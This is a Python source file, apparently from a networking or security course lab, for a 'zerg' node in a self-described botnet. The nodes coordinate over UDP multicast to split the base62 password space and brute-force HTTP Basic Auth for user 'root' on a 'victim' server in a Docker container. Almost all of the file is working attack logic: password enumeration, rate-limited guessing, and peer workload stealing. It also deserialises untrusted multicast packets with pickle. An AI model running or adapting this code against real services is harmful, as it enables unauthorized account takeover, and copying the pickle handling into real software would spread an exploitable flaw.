#Definitely not a botnet
from const import *
import base64
import socket
import struct
import selectors
import time
import string
import pickle
import copy
import datetime

BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits

def encode(num, alphabet):
    """Encode a positive number into Base X and return the string.1
    Arguments:
    - `num`: The number to encode
    - `alphabet`: The alphabet to use for encoding
    """
    if num == 0:
        return alphabet[0]
    arr = []
    arr_append = arr.append  # Extract bound-method for faster access.
    _divmod = divmod  # Access to locals is faster.
    base = len(alphabet)
    while num:
        num, rem = _divmod(num, base)
        arr_append(alphabet[rem])
    arr.reverse()
    return ''.join(arr)


def decode(password, alphabet=BASE62):
    """Decode a Base X encoded password into the number

    Arguments:
    - `password`: The encoded password
    - `alphabet`: The alphabet to use for decoding
    """
    base = len(alphabet)
    strlen = len(password)
    num = 0

    idx = 0
    for char in password:
        power = (strlen - (idx + 1))
        num += alphabet.index(char) * (base ** power)
        idx += 1
    return num

# Source: https://stackoverflow.com/questions/1119722/base-62-conversion
# Why are we using this: encoding our passwords as base62 enables us to use an integer to refer to any of the possible combinations
# of alphanumeric characters - this way, we do not need to generate all the possible passwords and store them in memory to then access
# via array index, but just get a random int number (in a range of course, that hasnt been used by peers) and then decode it into a
# password
# ======================================================================================================================================================================================

# UTILITY FUNCTIONS:

def getPWfromIDX(idx, size: int = PASSWORD_SIZE):
    #print("size:",size)
    if 0 > idx or idx >= (62**size):
        print("Idx not in range!")
        print("idx:",idx)
        print("range:",62**size)
        return "a"
    str = encode(idx, BASE62)
    if len(str) < size:
        diff = size - len(str)
        for i in range(diff):
            str = BASE62[0] + str
    return str

def overlaps(r1 : list, r2 : list):
    if r1[0] <= r2[1] and r1[1] >= r2[0]: return True
    else: return False

def mergeList(listt):
    '''Smoothes out the Verified array, removing duplicates and merging adjacent arrays'''
    listt.sort()
    changed = True
    while changed:
        changed = False
        for i in range(1,len(listt)):
            if overlaps(listt[i],listt[i-1]):
                maxR = max(listt[i][1],listt[i-1][1])
                newRange = [listt[i-1][0], maxR]
                del listt[i-1]
                del listt[i-1]
                listt.append(newRange)
                changed = True
                listt.sort()
                break
            elif listt[i-1][1]+1 == listt[i][0]:
                newRange = [listt[i-1][0], listt[i][1]]
                del listt[i-1]
                del listt[i-1]
                listt.append(newRange)
                changed = True
                listt.sort()
                break
    listt.sort()
    return listt

def invertRangeList(listt):
    listt = mergeList(listt)
    MAX = 62**PASSWORD_SIZE
    if len(listt) == 0: return [0, MAX]
    elif len(listt) == 1:
        if listt[0][0] == 0: return [[listt[0][1]+1, MAX]]
        elif listt[0][1] == MAX: return [[0, listt[0][0]-1]]
        else: return[[0,listt[0][0]-1],[listt[0][1]+1,MAX]]
    else:
        newlistt = []
        for i in range(len(listt)):
            if i == 0:
                if listt[i][0] == 0: continue
                else: newlistt.append([0, listt[i][0]-1])
            else:
                newlistt.append([listt[i-1][1]+1,listt[i][0]-1])
                if i == len(listt)-1: 
                    if not listt[i][1] == MAX:
                        newlistt.append([listt[i][1]+1,MAX])  
    return newlistt

def compareAddr(myAddr : str, theirAddr : str):
        myFields = myAddr.split(".")
        theirFields = theirAddr.split(".")
        for i in range(4):
            myF = int(myFields[i])
            theirF = int(theirFields[i])
            if myF == theirF: continue
            elif myF > theirF: return 1
            else: return -1
        return 0 

def contains(r1 : list, r2 : list):
    if r1[0]<=r2[0] and r2[1]<=r1[1]:
        return True
    return False

class zerg:
    # Get it get it it's a zerg rush
    # StarCraft ref - they're played by bruteforce :D
    # like here :D
    # until we can bamboozle the server that is

    def __init__(self, name: str = ""):
        # identifier
        #self.timejoin = time.time()

        # --Init Variables n stuff we'll need----
        self.sel = selectors.DefaultSelector()
        self.name = name
        self.found = False

        # --Things for communication with victim server (HTTP,TCP)---
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.HOST = "172.17.0.2"  # "host.docker.internal"
        self.PORT = 8000

        # ---Things for communication with brood (Multicast via udp)--
        self.mCastSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.mCastSock.settimeout(0.2)
        self.MCAST_TTL = struct.pack('b', 1)
        self.MCAST_GRP ='224.3.29.71'  # what we put here
        self.MCAST_PORT = 10000

        server_address = ('', 10000)
        self.mCastSock.bind(server_address)
        group = socket.inet_aton(self.MCAST_GRP)
        mreq = struct.pack('4sL', group, socket.INADDR_ANY)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
        # Listen for socket activity
        self.sel.register(self.mCastSock, selectors.EVENT_READ, self.recvMCAST)

        self.range = [0,30*PASSWORD_SIZE-1]
        self.current = self.range[0]-1
        self.verified = []
        self.peers = {}

        self.latest_pws = list()
        self.lastTry=0
        self.connect()

        hostname = socket.gethostname()
        self.address = socket.gethostbyname(hostname)
        print("I AM:",self.address)

    def isVerified(self, num : int):
        for i in range(len(self.verified)):
            if self.verified[i][0] >= num >= self.verified[i][1]: return True
        return False
    
    def isRangeVerified(self):
        for i in range(len(self.verified)):
            if contains(self.verified[i],self.range):
                return True
        return False

    def updateVerified(self):
        '''Smoothes out the Verified array, removing duplicates and merging adjacent arrays'''
        self.verified = mergeList(self.verified)

    def addToVerified(self, num):
        '''Insert a new num into verified - it'll be merged later'''
        self.verified.append([num, num])
        self.updateVerified()  # merges the mess we've created

    def selectNewRange(self):
        # firstly, tries to find any space not occupied by another slave
        self.updateVerified()
        # print("Deciding a new range!")
        # print("\tVerified:",self.verified)
        # print("\tPeer ranges:",self.peers)
        allOccupied = copy.deepcopy(self.verified)
        for peer in self.peers.keys():
            allOccupied.append(self.peers[peer][1])
        allOccupied = mergeList(allOccupied)
        # print("\tOccupied:",allOccupied)
        if allOccupied[0][1]-allOccupied[0][0] != 62**PASSWORD_SIZE:
            # a space without an active slave exists! -> immediately occupies the biggest space like this
            # print("Found at least one empty space! Occupying one.")
            invert = invertRangeList(allOccupied)
            # print("Free spaces:",invert)
            betterIDX = -1
            betterRNG = 62**PASSWORD_SIZE+1
            for i in range(len(invert)):
                RNG = invert[i][1]-invert[i][0]
                if RNG < betterRNG:
                    betterRNG = RNG
                    betterIDX = i

            #partToPick=random.randint(0,len(invert)-1)
            #print("DEBUG: betterIDX",betterIDX)
            if betterRNG > 30*PASSWORD_SIZE:
                return [invert[betterIDX][0],invert[betterIDX][0]+30*PASSWORD_SIZE-1]
            else:
                return invert[betterIDX]
        else:
            # all spaces are occupied by slaves or already checked -> choses the peer with the biggest workload, and divides it
            #print("No empty spaces, stealing from a peer.")
            #self.updateVerified()
            #invert = invertRangeList(self.verified)
            #print("DEBUG2: verified",self.verified)
            #print("DEBUG2: invert",invert)

            betterPeer = -1
            betterRNG = 0
            for peer in self.peers.keys():
                RNG = self.peers[peer][1][1]-self.peers[peer][1][0]
                if RNG > betterRNG:
                    betterRNG = RNG
                    betterPeer = peer
            #print("It would seems peer",betterPeer,"is the most overworked, taking from them!")
            #print("Better idx",betterIDX)
            low = int((self.peers[betterPeer][1][1] - self.peers[betterPeer][1][0])/2)
            return [low,self.peers[betterPeer][1][1]]

    def sayHello(self):
        '''Get a hello message'''  # Hello there
        msg = {
            'command': 'hello'
            # should we include our address here or smth?
        }
        encodedMSG = pickle.dumps(msg)

        #print("Sending HELLO message:", msg)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        #self.range = [0, 62**PASSWORD_SIZE]

    def sayImHere(self):
        '''Get a imhere message'''  # General Kenobi
        msg = {
            'command': 'imhere',
            'verified': self.verified,  # twitter famous
            'range': self.range,
        }
        encodedMSG = pickle.dumps(msg)

        #print("Sending IMHERE message:", msg)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayFoundPW(self):
        '''Get a foundpw message'''  # General Kenobi
        msg = {
            'command': 'foundpw',
            'pw': self.pw
        }
        encodedMSG = pickle.dumps(msg)

        #print("Slave", self.name+":", "sending FOUNDPW message:", msg)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    


    def sendMCAST(self, msg):
        #print("Slave", self.name+":", "sending message:", msg)
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(msg, (self.MCAST_GRP, self.MCAST_PORT))
        while True:
            #print("Slave", self.name+":", "waiting to recieve.")
            try:
                data, server = self.mcastSock.recvfrom(1024)
            except socket.timeout:
                print("timed out, no more responses.")
                break
            else:
                #print("Slave", self.name+":", "recieved:", data, "from", server)
                #print("aljfhdgajdshfbkasdjfnksnf")
                if server not in self.peers.keys():
                    #how does this not throw an error?????????? -c
                    # print("SKDFGSDHJFVHSDFHGIUSDJFOSDHBSJDHGBLKSDJKVBVNSDJKGBGBISDFBNBJSJDNGBNSKGFJKGJBNSDNFBSJNDFBFBKJN")
                    # print(self.peers)
                    self.peers[server]=[-1,[0,0]]
                    #print("after",self.peers)


    def recvMCAST(self):
        #print("Slave",self.name+":","waiting to recieve. recvmcast")
        try:
            data, server = self.mCastSock.recvfrom(1024)
            #print("\n\n!!!!",server,"\n\n")
        except socket.timeout:
            #print("Slave",self.name+":","timed out, no more responses.")
            return
        else:
            #check if we're receiving our own messages
            #print("Slave",self.name+":","recieved:",data,"from",server)
            #print("\n",self.mCastSock,"\n")
            recvMSG = pickle.loads(data) # I'm here message
            #print("received message:",recvMSG)
            if server in self.peers:
                self.peers[server]=[time.time(),self.peers[server][1]] #last seen at:
            else:
                self.peers[server]=[time.time(),[0,0]]
            if recvMSG['command']=='hello':
                #print("Recieved HELLO message:", recvMSG,"from",server,"\n\n")
                self.sayImHere()
            elif recvMSG['command']=='imhere':
                #print("Slave",self.name+":","It's a imhere message:", recvMSG)
                #print("Recieved IMHERE message:", recvMSG,"from",server)
                peerRange = recvMSG['range']
                self.peers[server][1] = peerRange
                peerVerified = recvMSG['verified']
                #print("Final Result:",self.verified,"\n\n")
                for range in peerVerified:
                    #print("Adding verified:", range)
                    self.verified.append(range)
                #print("Result:",self.verified,"Smoothing it out...")
                self.updateVerified()
                #print("Final Result:",self.verified,"\n\n")
                #print("My range:",self.range,"They're range:",peerRange)
                if overlaps(self.range,peerRange):
                    if compareAddr(self.address,server[0]) > 0:
                        #print("Our ranges overlap! Changing mine.")
                        #I need to adjust my range
                        # print("\n\nNEW RANGE!")
                        self.range = self.selectNewRange()
                        # print("Decided on:",self.range,"\n\n")
                        self.current = self.range[0]-1
                        #self.sayNewRange()
                        #print("IMHERE RESULT: New range:",self.range,"Starting from:",self.current,"\n\n")
                    else:
                        #print("IMHERE RESULT: Our ranges overlap! But I don't have to change. Continuing...","\n\n")
                        pass
                else: 
                    #print("IMHERE RESULT: Our ranges don't overlap!","\n\n")
                    pass
            # elif recvMSG['command']=='newrange':
            #     #print("Recieved NEWRANGE message:", recvMSG,"from",server)
            #     peerRange = recvMSG['range']
            #     self.peers[server][1] = peerRange
            #     #print("My range:",self.range,"They're range:",peerRange)
            #     if self.rangeOverlaps(peerRange):
            #         #print("NEW RANGE RESULT: Our ranges overlap! Someone is trying to offload some of my work.") 
            #         pass
            #         #print("New range:",self.range,"Continuing from:",self.current,"\n\n")
            #     else:
            #         #print("NEW RANGE RESULT: Our ranges don't overlap! Peer updated.","\n\n")
            #         pass
            # elif recvMSG['command']=='gotall':
            #     pass
            elif recvMSG['command']=='foundpw':
                print("Password found:",recvMSG["pw"]+"!","Shutting down...")
                exit(0) # Shutting down...
            return

    def connect(self):
        """Connect to chat server and setup stdin flags."""
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.HOST, self.PORT))

    def try_pw(self, pw: str):
        """Creates the AuthHeader with the created pw"""  # password, not powerword - a priest would help here though
        ID = "root"

        authHead = ID+":"+pw
        authHeadB64 = base64.b64encode(authHead.encode()).decode()

        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\r\n\r\n'''  # internet says to use carriage return but not sure why

        #print("testing pw:", pw)
        #print("PW:", pw)
        msg = httpHeader
        self.send_msg(msg)

    def send_msg(self, msg):
        """Sends ONE (1) message to VICTIM"""  # mwahaha
        encoded_msg = str(msg).encode("utf-8")
        self.s.send(encoded_msg)
        self.server_response()

    def victory(self):
        picture_raw=b""
        pic_part=b""
        incoming_parts=b""
        while True: #end of jpg
            while not b"\r\n" in incoming_parts:
                incoming_parts = incoming_parts+self.s.recv(1)
                print("incoming parts:",incoming_parts)
                if incoming_parts == b"":
                    #picture_raw=b"\xFF\xD8"+picture_raw.split(b"\xFF\xD8")[1]
                    # print("pic raw:",picture_raw.decode())
                    with open("success.jpg", "wb") as img:
                        img.write(picture_raw)
                    #data = open("success.jpg", "rb").read()
                    exit(0)
            size=incoming_parts.split(b"\r\n")[0]
            #print("raw  chunk size? :",size)
            size=int(size,16)
            print("next size:",size)
            incoming_parts = (self.s.recv(int(size)+3))
            print("DEBUG: defore clean:",incoming_parts)
            # \r\n e o separador de chunked, not \t\n\r\n, era bait
            incoming_parts=incoming_parts[:-2] # these are not the bytes you're looking for
            print("DEBUG: after clean:",incoming_parts)

            print("very rawreceived",incoming_parts)
            #if incoming_parts.match("\\x[0-9A-F][0-9A-F]"):
            picture_raw=picture_raw+incoming_parts
            incoming_parts=b""

            #print(" rawreceived: ",incoming_parts.split(b'\r\n')[1])

            #print("received: ",incoming_parts.decode())
            #print(picture_raw,"\n---------------------\n\n\n")


       

    def server_response(self):
        """Receives ONE (1) http response"""
        incoming = ""
        incoming_raw=b""
        while not "\r\n\r\n" in incoming:
            incoming_parts = self.s.recv(500)
            incoming_raw=incoming_raw+incoming_parts
            # try:
            incoming = incoming_raw.decode("ascii")
            # except UnicodeDecodeError:
                # I think we're supposed to receive a picture here but this is a puzzle for future camila :P
            #   self.victory(incoming_raw)
            #    break
            #else:
        #print("\n\n!!!!!",incoming,"\n\n")
            #    pass
        

        if '200' in incoming.split("\r\n\r\n")[0]:
            self.found = True
            self.pw = getPWfromIDX(self.current, PASSWORD_SIZE)
            print("GOT IT!\nwas it "+self.pw+"?")
            self.sayFoundPW()
            print("VERY IMPORTANT: ",incoming.split("\r\n\r\n"))
            self.victory()

    def loop(self):
        #self.sayHello()
        while not self.found:
            #print("time now:",time.time())
            #print("target time:",self.lastTry + COOLDOWN_TIME/1000)
            if self.isRangeVerified(): 
                self.range = self.selectNewRange()
                self.current = self.range[0]-1
            if time.time()>self.lastTry + COOLDOWN_TIME/1000:  # TODO - verify  that cooldown time has passed since last time
                print("all your base are belong to us")  # nice ref :D
                print(time.ctime(time.time()),": MY RANGE =",self.range)
                toTest = []
                full = False
                for i in range(MIN_TRIES):  # get next MIN_TRIES passwords from ids
                    self.current += 1
                    if self.current > self.range[1]:
                        full = True
                        break
                    if self.isVerified(self.current): continue
                    self.try_pw(getPWfromIDX(self.current, PASSWORD_SIZE))
                    print("TRIED:",self.current)
                    self.addToVerified(self.current)
                    #self.range[0] = self.current+1
                    if self.found:
                        # send FOUNDPW message
                        #print("it was "+getPWfromIDX(self.current, PASSWORD_SIZE))
                        return getPWfromIDX(self.current, PASSWORD_SIZE)
                self.lastTry = time.time()
                self.sayImHere()
                #print(time.ctime(time.time()),": VERIFIED =",self.verified)
                if full:
                    #print("Reached the end of my rope! Choosing a new range.")
                    # print("\n\nNEW RANGE!")
                    self.range = self.selectNewRange()
                    # print("Decided on:",self.range,"\n\n")
                    self.current = self.range[0]-1
                    #print("IMHERE RESULT: New range:",self.range,"Starting from:",self.current,"\n\n")
                    pass

            # The usual method for event treatment

            #print("current peers: ",self.peers)
            for peer in self.peers.keys():
                #print("old time: ",self.peers[peer][0])
                #print("new time: ",time.time() - 5)
                if self.peers[peer][0] < time.time() - 5 and time.time() - 15!=0 :
                    #print("took too long bye")
                    self.peers.pop(peer)
                    break
            toDo = self.sel.select(0)
            for event, data in toDo:
                callback = event.data
                msg = callback()

slave = zerg("Brood1")
slave.loop()

#################### OLD

# def newRange(self):
    #     '''Get a newrange message'''  # this is mine now
    #     msg = {
    #         'command': 'newrange',
    #         'range': self.range
    #     }
    #     encodedMSG = pickle.dumps(msg)

    #     #print("Slave", self.name+":", "sending NEWRANGE message:", msg)
    #     self.mCastSock.setsockopt(
    #         socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
    #     self.mCastSock.sendto(encodedMSG,(self.MCAST_GRP, self.MCAST_PORT))
        

    # def gotAll(self):
    #     '''Get a gotall message'''   # my work here is done
    #     msg = {
    #         'command': 'gotall'
    #     }
    #     encodedMSG = pickle.dumps(msg)

    #     #print("Slave", self.name+":", "sending GOTALL message:", msg)
    #     self.mCastSock.setsockopt(
    #         socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
    #     self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))


    # def foundPw(self):  # the 200 ok marks the spot
    #     '''Get a gotall message'''
    #     msg = {
    #         'command': 'foundpw',
    #         'pw': self.pw
    #     }
    #     encodedMSG = pickle.dumps(msg)
    #     #print("Slave", self.name+":", "sending FOUNDPW message:", msg)
    #     self.mCastSock.setsockopt(
    #         socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
    #     self.mCastSock.sendto(encodedMSG,(self.MCAST_GRP, self.MCAST_PORT))
    #     exit(0)

        # def sayNewRange(self):
    #     '''Get a newrange message'''  # General Kenobi
    #     msg = {
    #         'command': 'newrange',
    #         'range': self.range
    #     }
    #     encodedMSG = pickle.dumps(msg)

    #     #print("Slave", self.name+":", "sending NEWRANGE message:", msg)
    #     self.mCastSock.setsockopt(
    #         socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
    #     self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))